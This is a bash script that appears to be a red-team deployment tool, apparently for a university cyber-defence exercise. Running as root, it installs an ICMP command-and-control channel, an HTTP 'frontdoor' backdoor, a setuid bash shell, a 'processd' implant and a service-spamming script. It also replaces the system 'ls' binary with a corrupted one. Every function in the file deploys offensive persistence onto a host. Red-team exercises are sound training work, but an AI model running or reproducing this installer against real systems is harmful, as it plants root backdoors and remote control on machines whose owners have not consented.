#!/bin/bash
WHICH="$1"
ROOT_PATH="$(dirname $( realpath "$0"  ))"
export RED_TEAM_ROOT="$ROOT_PATH"

echo "Dirname: $ROOT_PATH"
echo "Which: $WHICH"

IS_UB_LOCKDOWN=true


if [[ $(id -u) != "0" ]]; then
    echo "Must run as root"
    exit 1
fi


http_takedown () {
    cd "$ROOT_PATH/http-takedown"
    chmod +x ./install.sh
    ./install.sh
}

icmpC2 () {
    cd "$ROOT_PATH/icmp-c2"
    chmod +x ./install.sh
    ./install.sh
}

ping_install () {
    cd "$ROOT_PATH/ping"
    chmod +x ./install.sh
    ./install.sh
}

processd () {
    cd "$ROOT_PATH/processd"
    chmod +x ./install.sh
    ./install.sh
}

serviceSpam () {
    cd "$ROOT_PATH/service-spam"
    python3 service.py
}

http_frontdoor () {
    cd "$ROOT_PATH/http-frontdoor"
    chmod +x ./install.sh
    ./install.sh
}

corrupted_ls () {
    # Pre-compiled: will not run for all OS!
    cd "$ROOT_PATH/coreutils"
    chown 755 ls
    mv ls $(which ls)
}

setuid_bash () {
    cd "$ROOT_PATH/setuid-bash"
    chmod +x ./install.sh
    ./install.sh
}


if [[ "$WHICH" == "all" ]]; then
    # Currently debugging installer script
    icmpC2
    ping_install
    processd
    http_takedown
    setuid_bash
    http_frontdoor

    if [[ $IS_UB_LOCKDOWN == "true" ]]; then
        corrupted_ls
    fi

    serviceSpam
fi

# TODO: add more individual installs
if [[ "$WHICH" == "icmp" ]]; then
    icmpC2
fi
if [[ "$WHICH" == "ping" ]]; then
    ping_install
fi
if [[ "$WHICH" == "processd" ]]; then
    processd
fi
if [[ "$WHICH" == "services" ]]; then
    serviceSpam
fi

unset RED_TEAM_ROOT